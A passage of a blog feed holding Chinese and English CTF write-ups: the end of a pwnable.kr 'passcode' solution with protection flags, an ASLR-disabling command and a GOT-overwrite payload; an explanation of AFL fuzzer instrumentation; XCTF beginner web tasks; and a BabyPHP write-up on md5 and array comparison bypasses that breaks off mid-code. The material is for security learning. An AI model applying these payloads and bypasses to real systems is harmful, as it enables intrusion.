class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; gcc -o test test.c // 默认情况下，不开启Canary保护</span><br><span class="line">&gt; gcc -fno-stack-protector -o test test.c //禁用栈保护</span><br><span class="line">&gt; gcc -fstack-protector -o test test.c //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">&gt; gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><font color="orage">**④ FORTIFY**</font><p>&nbsp;&nbsp;&nbsp;&nbsp;fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(<em>gcc -O1</em>)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 <code>#include &lt;string.h&gt;</code>)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p><font color="orage">**⑤ PIE(ASLR)**</font><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PIE 即 <a href="https://zh.wikipedia.org/wiki/地址无关代码" target="_blank" rel="noopener">Postion-Indenpendent executable</a>(地址无关可执行文件)。一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;内存地址随机化机制（address space layout randomization)，有以下三种情况</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;0 - 表示关闭进程地址空间随机化。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1 - 表示将mmap的基址，stack和vdso页面随机化。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2 - 表示在1的基础上增加栈（heap）的随机化。</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;可以防范基于<font color="red"><strong>Ret2libc</strong></font>方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p><p><br>&nbsp;&nbsp;&nbsp;&nbsp;liunx下关闭PIE的命令如下：</p><p><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p></blockquote><h4 id="5-GOT-表覆写技术"><a href="#5-GOT-表覆写技术" class="headerlink" title="5.GOT 表覆写技术"></a><font color="navy">5.GOT 表覆写技术</font></h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;原理：由于<font color="red"><strong>got表是可写</strong></font>的，把其中的函数地址覆盖为我们shellcode地址，在程序进行调用这个函数时就会执行shellcode。</p></blockquote><h3 id="三、题目要求"><a href="#三、题目要求" class="headerlink" title="三、题目要求"></a><font color="brown">三、题目要求</font></h3><p><img src="/images/81-3.png" alt></p><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;该题要求我们连接 pwnable.kr 的服务器，密码是 guest，经过尝试我在 Linux 系统环境下连上去以后，看看了目录，如下：</p></blockquote><p><img src="/images/81-4.png" alt></p><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;题目可能是让我们通过这三个文件找出 flag。</p></blockquote><h3 id="四、解题思路"><a href="#四、解题思路" class="headerlink" title="四、解题思路"></a><font color="brown">四、解题思路</font></h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;在整理出解题思路之前，我们需要试探一下题目中的文件，看看文件有什么要求。</p><font color="orage">**① 查看 passcode 的文件类型**</font><p><center>`file passcode`</center><br><img src="/images/81-6.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;从上图可以看出，passcode 是一个 32 位的 ELF 文件。</p><font color="orage">**② 查看 passcode 的保护机制** </font><p><center>`checksec passcode`</center><br><img src="/images/81-5.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;从上图可以说明：</p><ul><li>passcode 文件是 i386 的</li><li>我们对 GOT 有写的权限</li><li>开启了栈保护，也就意味着我们没有办法利用栈溢出</li></ul><font color="orage">**③ 查看 passcode.c 的源文件 **</font><p><img src="/images/81-7.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;从上图可以看到 scanf 语句中没有 <code>&amp;</code> 取值符号，所以我们可以根据这个来利用漏洞</p><font color="orage">**④ 查看 welcome 和 login 函数** </font><p>&nbsp;&nbsp;&nbsp;&nbsp;通过分析 passcode.c 的源代码，我们可以发现 main（caller）连续调用了 welcome 和 login 函数，在调用的时候并没有 push 和 pop，所有这两个函数用的是同一个 ebp，如下图：</p><p><img src="/images/81-8.png" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;那么我们找到name位于ebp-0x70，passcode1位于ebp-0x10，passcode2位于ebp-0xc，name与passcode1之间隔了0x70-0x10=96个字节。</p><font color="orage">**⑤ 如何利用 scanf 和 GOT 表漏洞**</font><p>&nbsp;&nbsp;&nbsp;我们可以用 fflush() / printf() 的地址覆盖 passcode1 后，scanf(“%d”，&amp;fflush()) 将会把之后的输入写入到GOT表中，于是把 login() 中 system(“/bin/cat flag”) 的地址转换成十进制写进去，当程序调用fflush()的时候就会执行system()，思路如下图：</p><p><img src="/images/81-9.png" alt></p></blockquote><h3 id="五、解题步骤"><a href="#五、解题步骤" class="headerlink" title="五、解题步骤"></a><font color="brown">五、解题步骤</font></h3><h4 id="1-构造-payload"><a href="#1-构造-payload" class="headerlink" title="1.构造 payload"></a><font color="navy">1.构造 payload</font></h4><blockquote><p>payload = ‘a’*96+’\x00\xa0\x04\x08’ +’134514147\n’</p></blockquote><h4 id="2-python-c-执行命令"><a href="#2-python-c-执行命令" class="headerlink" title="2.python -c 执行命令"></a><font color="navy">2.python -c 执行命令</font></h4><blockquote><p><code>python - c &quot;print(&#39;a&#39;*96+&#39;\x00\xa0\x04\x08&#39; +&#39;134514147\n&#39;)&quot;|./passcode</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;结果如下图：</p><p><img src="/images/81-10.png" alt></p></blockquote><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><font color="brown">参考文章</font></h3><p><a href="https://blog.csdn.net/qq_18661257/article/details/54694748" target="_blank" rel="noopener">GOT表和PLT表知识详解</a></p><p><a href="https://blog.csdn.net/kevin66654/article/details/78213690" target="_blank" rel="noopener">pwnable.kr - passcode</a></p><p><a href="https://blog.csdn.net/smalosnail/article/details/53027024" target="_blank" rel="noopener">pwnable 笔记 Toddler’s Bottle - passcode</a></p><p><a href="https://blog.csdn.net/smalosnail/article/details/53247502" target="_blank" rel="noopener">scanf忘记加’&amp;’危害有多大？ 详解GOT表覆写攻击技术</a></p><p><a href="https://www.cnblogs.com/p4nda/p/7122094.html" target="_blank" rel="noopener">p4nda</a></p><p><a href="https://blog.csdn.net/u012763794/article/details/51992512" target="_blank" rel="noopener">通过pwnable.kr从零学pwn</a></p><p><a href="https://blog.csdn.net/summonlight/article/details/81123785" target="_blank" rel="noopener">C语言函数调用栈(一)</a></p><p><a href="https://blog.csdn.net/axiejundong/article/details/73065023" target="_blank" rel="noopener">软件常用安全防护手段 checksec 总结</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、前言&lt;/font&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;pwn 是 CTF 比赛中重要的一种题型，但
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://muzibing.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>AFL 的代码插桩问题</title>
    <link href="https://muzibing.github.io/2019/09/07/2019.09.07%EF%BC%8880%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/07/2019.09.07（80）/</id>
    <published>2019-09-06T16:00:00.000Z</published>
    <updated>2019-09-07T10:36:22.237Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、什么是-AFL？"><a href="#一、什么是-AFL？" class="headerlink" title="一、什么是 AFL？"></a><font color="brown">一、什么是 AFL？</font></h3><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;AFL 是一款用于发现漏洞的<font color="red"><strong>模糊测试工具</strong></font>，是由下面三个部分组成的：</p><ul><li><p>编译器wrapper：他的功能在于对目标软件（开源）进行编译，编译过程中插入一些AFL识别的函数用以识别探索路径，众所周知的linux下的C/C++编译工具gcc/g++，afl的编译工具为afl-gcc/afl-g++,afl-clang等。</p></li><li><p>测试器fuzzer （主体）：<code>afl-fuzz</code>，就是AFL重要的主体，用以对软件进行fuzzing。</p></li><li><p>其他工具：如afl-cmin,afl-tmin等，一个成功的C位都必须多个辅助才行，这些工具都是为提升测试的效率和成功率而服务的。</p></li></ul><p>&nbsp;&nbsp;它的工作流程如下图：</p><p><img src="/images/80-1.png" alt></p></blockquote><h3 id="二、代码插桩"><a href="#二、代码插桩" class="headerlink" title="二、代码插桩"></a><font color="brown">二、代码插桩</font></h3><h4 id="1-什么是插桩？"><a href="#1-什么是插桩？" class="headerlink" title="1.什么是插桩？"></a><font color="navy">1.什么是插桩？</font></h4><blockquote><p>&nbsp;&nbsp;&nbsp;&nbsp;在AFL编译文件时候afl-gcc会在规定位置插入桩代码，可以理解为一个个的<font color="red"><strong>探针</strong></font>(但是没有暂停功能)，在后续fuzz的过程中会<font color="red"><strong>根据这些桩代码进行路径探索，测试等</strong>。</font>对于插桩的理解也可以这样理解，如下图：</p><p><img src="/images/80-2.jpg" alt></p><p>&nbsp;&nbsp;&nbsp;&nbsp;如果我们输入的数据是：a = 3,b = 3，那么程序会输出多少呢？通过程序的执行可以得到一个路径：<font color="red">ABDCFG</font>，那么在这个程序里 printf 语句就是我们插入的代码。</p><p>​    在简单的了解了什么是插桩后，下面我们来介绍一下 afl 中的插桩。</p></blockquote><h4 id="2-AFL-中的插桩"><a href="#2-AFL-中的插桩" class="headerlink" title="2.AFL 中的插桩"></a><font color="navy">2.AFL 中的插桩</font></h4><blockquote><p><strong>① 插桩存在 afl 测试中的哪一个环节？</strong></p><p>​     <img src="/images/80-3.png" alt></p><p>​     从上面的图中可以得出，AFL 的插桩是在编译的过程中同时进行插桩的，afl-gcc 是 afl 的一个编译器，是将源语言编译成汇编代码，而插桩是在汇编代码汇编成机器代码的过程中进行的，对于linux来说，as 是常用的汇编器，那么 afl-as 便会作为汇编器，执行实际的汇编操作。<font color="red">所以说，AFL 的代码插桩，就是将源文件编译成汇编代码后，通过<code>afl-as</code>来完成的</font>。 afl-as 会生成<strong>一个随机数</strong>，作为标识分支的 key。</p><p><img src="/images/80-5.png" alt></p><p>​     在这里需要值得注意的是，实际插桩是 <code>afl-as</code> 来完成的，那么为什么又说 <code>afl-gcc</code> 是来插桩的呢？因为 afl-gcc 的源码中在头文件中调用了 afl-as.h 所以说是将 afl-as 的功能装进了 afl-gcc 里。</p><p><img src="/images/80-4.jpg" alt></p><p><strong>② AFL 中的编译器</strong></p><p>​     对于 afl 的编译器来说有两种，一种是 afl-gcc，一种是 afl-clang，通过查看源码可以得到，这两个编译器实际上是 gcc、clang 的一个 wrapper。</p><p><strong>③ 如何进行插桩</strong> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">add_instrumentation</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">&gt;     <span class="keyword">if</span> (input_file)</span><br><span class="line">&gt;    &#123; <span class="comment">//打开输入文件</span></span><br><span class="line">&gt;         inf = fopen(input_file, <span class="string">"r"</span>);</span><br><span class="line">&gt;         <span class="keyword">if</span> (!inf) PFATAL(<span class="string">"Unable to read '%s'"</span>, input_file);</span><br><span class="line">&gt;     &#125; </span><br><span class="line">&gt;     <span class="keyword">else</span> </span><br><span class="line">&gt;         inf = <span class="built_in">stdin</span>;</span><br><span class="line">&gt;     outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="number">0600</span>); <span class="comment">//创建输出文件</span></span><br><span class="line">&gt;     <span class="keyword">if</span> (outfd &lt; <span class="number">0</span>) </span><br><span class="line">&gt;         PFATAL(<span class="string">"Unable to write to '%s'"</span>, modified_file);</span><br><span class="line">&gt;     outf = fdopen(outfd, <span class="string">"w"</span>);</span><br><span class="line">&gt;     <span class="keyword">if</span> (!outf) </span><br><span class="line">&gt;         PFATAL(<span class="string">"fdopen() failed"</span>); </span><br><span class="line">&gt;     <span class="keyword">while</span> (fgets(line, MAX_LINE, inf)) <span class="comment">//读取输入的每行</span></span><br><span class="line">&gt;     &#123; </span><br><span class="line">&gt;         <span class="keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp; <span class="comment">//它只会在代码里的合适位置插桩而不会对文件每行插桩，判断代码在下面，</span></span><br><span class="line">&gt;         instrument_next &amp;&amp; line[<span class="number">0</span>] == <span class="string">'\t'</span> &amp;&amp; <span class="built_in">isalpha</span>(line[<span class="number">1</span>])) </span><br><span class="line">&gt;         &#123;</span><br><span class="line">&gt;             <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, <span class="comment">//关键处，会根据位数选择对应模板</span></span><br><span class="line">&gt;             R(MAP_SIZE)); <span class="comment">//R(MAP_SIZE)定义为 # define R(x) (random() % (x))</span></span><br><span class="line">&gt;             instrument_next = <span class="number">0</span>;</span><br><span class="line">&gt;             ins_lines++;</span><br><span class="line">&gt;         &#125;</span><br><span class="line">&gt;         <span class="built_in">fputs</span>(line, outf); <span class="comment">//输出</span></span><br><span class="line">&gt;         <span class="comment">//以下为如上插桩条件判断代码。。。</span></span><br><span class="line">&gt;     &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>​     执行的插桩代码实际上是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32, R(MAP_SIZE));</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>​     这里要以 32 位的模板为例，给出要插入的 <code>trampoline_fmt_32</code> 的汇编代码段，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt; static const u8* trampoline_fmt_32 =</span><br><span class="line">&gt; </span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;.align 4\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;leal -16(%%esp), %%esp\n&quot;</span><br><span class="line">&gt;   &quot;movl %%edi, 0(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl %%edx, 4(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl %%ecx, 8(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl %%eax, 12(%%esp)\n&quot;</span><br><span class="line">&gt;   &quot;movl $0x%08x, %%ecx\n&quot;</span><br><span class="line">&gt;   &quot;call __afl_maybe_log\n&quot;</span><br><span class="line">&gt;   &quot;movl 12(%%esp), %%eax\n&quot;</span><br><span class="line">&gt;   &quot;movl 8(%%esp), %%ecx\n&quot;</span><br><span class="line">&gt;   &quot;movl 4(%%esp), %%edx\n&quot;</span><br><span class="line">&gt;   &quot;movl 0(%%esp), %%edi\n&quot;</span><br><span class="line">&gt;   &quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;</span><br><span class="line">&gt;   &quot;/* --- END --- */\n&quot;</span><br><span class="line">&gt;   &quot;\n&quot;;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><p>&gt;</p><blockquote><p>​    上面的汇编代码主要做了一下几个工作：</p><ul><li><p>保存 edi 等寄存器</p></li><li><p>将 ecx  的值设置为 fprintf() 所要打印的变量（key）内容</p></li><li><p>调用方法__afl_maybe_log()</p></li><li><p>恢复寄存器</p></li></ul><p><img src="/images/80-7.jpg" alt></p></blockquote><h4 id="3-实现代码插桩的途径"><a href="#3-实现代码插桩的途径" class="headerlink" title="3.实现代码插桩的途径"></a><font color="navy">3.实现代码插桩的途径</font></h4><blockquote><p>（1）它可以通过<strong>插入汇编代码</strong>直接在每个分支点周围用汇编来扩充二进制文件。</p><p>（2）它可以使用<strong>模拟器（QEMU）捕获无法重新编译</strong>的二进制文件的跟踪信息。</p><p>（3）它可以通过在<strong>LLVM中添加传递并添加汇编语言</strong>以“原则”方式执行操作。通过LLVM的方法（3）的一个优点是LLVM可以产生非常干净的中间表示（称为bitcode）</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、什么是-AFL？&quot;&gt;&lt;a href=&quot;#一、什么是-AFL？&quot; class=&quot;headerlink&quot; title=&quot;一、什么是 AFL？&quot;&gt;&lt;/a&gt;&lt;font color=&quot;brown&quot;&gt;一、什么是 AFL？&lt;/font&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="fuzz" scheme="https://muzibing.github.io/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>XCTF 新人阶段 — web</title>
    <link href="https://muzibing.github.io/2019/09/02/2019.09.02%EF%BC%8879%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/09/02/2019.09.02（79）/</id>
    <published>2019-09-01T16:00:00.000Z</published>
    <updated>2019-09-07T10:30:44.626Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Today I mainly write some notes about the web topic of the XCTF newcomer stage.The following is a list of topics.</p><ol><li>view source</li><li>get post</li><li>robots</li><li>backup</li><li>cookie</li><li>disabled button</li><li>simple js</li><li>xff referer</li><li>weak auth</li><li>webshell</li><li>command execution</li><li>simple php</li></ol><p>In order to make the knowledge points involved in each topic as clear as possible.I only summarize the knowledge points of the first two topics.</p></blockquote><h3 id="一、view-source"><a href="#一、view-source" class="headerlink" title="一、view source"></a><font color="brown">一、view source</font></h3><h4 id="1-Question-requirment"><a href="#1-Question-requirment" class="headerlink" title="1. Question requirment"></a><font color="navy">1. Question requirment</font></h4><p><img src="/images/79-1.png" alt></p><h4 id="2-Basic-knowledge"><a href="#2-Basic-knowledge" class="headerlink" title="2.Basic knowledge"></a><font color="navy">2.Basic knowledge</font></h4><blockquote><p>what is the role of browser F12?</p><ul><li><font color="blue">**Elements**</font><p>It is used  to view  or modify the attributes of HTML elements ,CSS properties,listen events,breakpoints,and more.</p></li><li><font color="blue">**Console**</font><p>The console is typically used to <em>execute</em> one-time code,view JavaScript objects,and view debug log information or <em>exception</em> information.</p></li><li><font color="blue">**Sources**</font><p>The page is used to view the HTML source code of the current web page,JavaScript source code,CSS source code,and most importantly,you can debug(调试) the JavaScript source code,add breakpoints to the JS code and so on.</p></li><li><font color="blue">**Network**</font><p>Network page is mainly used to view information related to the network connection such as the header.</p><p><img src="/images/79-2.png" alt></p><ul><li><strong>Header</strong>:The panel lists the resource request url,HTTP method,response status code,request header and response header and their respective values,request parameter,etc.</li><li><strong>Preview</strong>:View panel to view resource </li><li><strong>Response</strong>:The response information panel contains content that has not been formatted by resource</li><li><strong>Timing</strong>:The details of the resource request take time.</li></ul></li></ul></blockquote><h4 id="3-Problem-solving-step"><a href="#3-Problem-solving-step" class="headerlink" title="3.Problem solving  step"></a><font color="navy">3.Problem solving  step</font></h4><blockquote><p>Press f12 button and we can view the flag on the Elements page.</p><p><img src="/images/79-3.png" alt></p></blockquote><h3 id="二、post-get"><a href="#二、post-get" class="headerlink" title="二、post_get"></a><font color="brwon">二、post_get</font></h3><h4 id="1-Question-Requirement"><a href="#1-Question-Requirement" class="headerlink" title="1.Question Requirement"></a><font color="navy">1.Question Requirement</font></h4><p><img src="/images/79-4.png" alt></p><h4 id="2-Basic-knowledge-1"><a href="#2-Basic-knowledge-1" class="headerlink" title="2.Basic knowledge"></a><font color="navy">2.Basic knowledge</font></h4><blockquote><p>◉ First,there are some difference between post and get.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Because someone has done a good summary of the two requests,I can’t summarize them here.<a href="https://www.zhihu.com/question/28586791" target="_blank" rel="noopener">Click here to learn more.</a></p></blockquote><h4 id="3-Problem-Solving-step"><a href="#3-Problem-Solving-step" class="headerlink" title="3.Problem Solving step"></a><font color="navy">3.Problem Solving step</font></h4><blockquote><p>◉ The first step:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Open the URL in the question and find that we are required to submit a variable named “a” with a value of 1 by GET method.</p><p><img src="/images/79-5.png" alt></p><p>◉ The second step:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;I constructed “?a=1” in the GET request line by BurpSuit.As shown following the picture:</p><p><img src="/images/79-6.png" alt></p><p>◉ The third step:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;In the previous step,we will send the constructed command to the server and we will get the following page:</p><p><img src="/images/79-7.png" alt></p><p>◉ The fourth step:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;The step requires us to submit a variable named “b” with a value of 2 by POST method.Here,we need to use a tool named “HackBar”.We can do the work by it.</p><p><img src="/images/79-8.png" alt></p><p>◉ The last step:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;In the step,we can get the flag about the problm.</p><p><img src="/images/79-9.png" alt></p></blockquote><p>​    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Today I mainly write some notes about the web topic of the XCTF newcomer stage.The following is a list of topics.&lt;/p&gt;
&lt;ol&gt;
&lt;
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>BabyPHP 解题总结</title>
    <link href="https://muzibing.github.io/2019/08/01/2019.08.01%EF%BC%8878%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/08/01/2019.08.01（78）/</id>
    <published>2019-07-31T16:00:00.000Z</published>
    <updated>2019-09-07T10:30:53.673Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、PHP-部分漏洞"><a href="#一、PHP-部分漏洞" class="headerlink" title="一、PHP 部分漏洞"></a><font color="brown">一、PHP 部分漏洞</font></h3><h4 id="1-GET-和-POST"><a href="#1-GET-和-POST" class="headerlink" title="1.$_GET 和 $_POST"></a><font color="navy">1.$_GET 和 $_POST</font></h4><blockquote><p>如果 GET 参数中设置 <code>name[]=a</code>，那么 <code>$_GET[&#39;name&#39;] = [a]</code>，php 会把 <code>[]=a</code> 当成数组传入， <code>$_GET</code> 会自动对参数调用 <code>urldecode</code>。</p><p><code>$_POST</code> 同样存在此漏洞，提交的表单数据，<code>user[]=admin</code>，<code>$_POST[&#39;user&#39;]</code> 得到的是 <code>[&#39;admin&#39;]</code> 是一个数组。</p></blockquote><h4 id="2-sha1-和-md5-函数"><a href="#2-sha1-和-md5-函数" class="headerlink" title="2.sha1 和 md5 函数"></a><font color="navy">2.sha1 和 md5 函数</font></h4><blockquote><p>PHP在处理哈希字符串时，<strong>会利用 ”!=” 或 ”==” 来对哈希值进行比较</strong>，它把每一个以 “0E” 开头的哈希值都解释为 <strong>0</strong>，所以<font color="red">如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，那么PHP将会认为它们都是 <strong>0</strong></font>。</p><p>MD5不能处理数组，若有以下判断则可用数组<strong>绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span>(@md5($_GET[<span class="string">'a'</span>]) == @md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     <span class="keyword">echo</span> <span class="string">"yes"</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="3-”-“-符号"><a href="#3-”-“-符号" class="headerlink" title="3.” === “ 符号"></a><font color="navy">3.” === “ 符号</font></h4><blockquote><p>在数学计算中我们习惯的用 “a = b”，表示的意思是 a 的值与 b 的值相等，而在计算机世界中这样的说法是完全错误的，在计算机的计算中</p><ul><li>“ <strong>a = b</strong> ”：表示的意思是将 b 的值赋值给 a；</li><li>“ <strong>a == b</strong> ”：表示的意思是判断 a 的值与 b 的值是否相等；</li><li>“ <strong>a === b</strong> ”：表示的意思是 a 的<strong>类型</strong>以及<strong>相应的值</strong>与 b 的<strong>类型</strong>以及<strong>相应的值</strong>是否相等，如果返回 1，则表示，a 与 b 是同类型同值关系；</li></ul></blockquote><h3 id="二、分析题目"><a href="#二、分析题目" class="headerlink" title="二、分析题目"></a><font color="brown">二、分析题目</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;title&gt;Exercise&lt;/title&gt; </span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;h1&gt;PHP&apos;s basic feature&lt;/h1&gt;&lt;!--好吧其实是老套路了--&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">require_once(&apos;flag.php&apos;); </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]) &amp;&amp; isset($_GET[&apos;test&apos;]))&#123; </span><br><span class="line">    // ========== Stage 1 ==========  </span><br><span class="line">    $test=$_GET[&apos;test&apos;];  </span><br><span class="line">    $test=md5($test);  </span><br><span class="line"></span><br><span class="line">    if($test==&apos;0&apos;) &#123;  </span><br><span class="line">        print &apos;You passed stage 1.&lt;br /&gt;&apos;; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        print &quot;Game over at stage 1.&quot;;  </span><br><span class="line">        exit(); </span><br><span 